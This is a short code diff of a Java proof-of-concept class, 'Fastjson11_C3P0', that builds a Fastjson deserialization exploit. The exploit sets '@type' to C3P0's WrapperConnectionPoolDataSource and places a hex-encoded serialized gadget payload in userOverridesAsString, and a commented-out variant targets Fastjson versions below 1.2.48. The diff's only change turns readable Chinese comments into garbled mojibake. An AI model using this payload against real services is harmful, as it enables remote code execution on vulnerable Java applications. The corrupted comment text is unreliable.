@@ -7,12 +7,12 @@ public class Fastjson11_C3P0 {
         InputStream in = new FileInputStream("D:\\Downloads\\workspace\\javareadobject\\1.ser");
         byte[] payload = toByteArray(in);
         String payloadHex = bytesToHex(payload, payload.length);
-        //C3P0 二次反序列化
+        //C3P0浜屾鍙嶅簭鍒楀寲
         String poc = "{\r\n"
         		+ "    \"@type\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\", \r\n"
         		+ "    \"userOverridesAsString\": \"HexAsciiSerializedMap:"+payloadHex+";\"\r\n"
         		+ "}";
-    	//<1.2.48 and C3P0 二次反序列化
+    	//<1.2.48 and C3P0浜屾鍙嶅簭鍒楀寲
 //        poc = "{\r\n"
 //        		+ "    \"a\": {\r\n"
 //        		+ "        \"@type\": \"java.lang.Class\", \r\n"
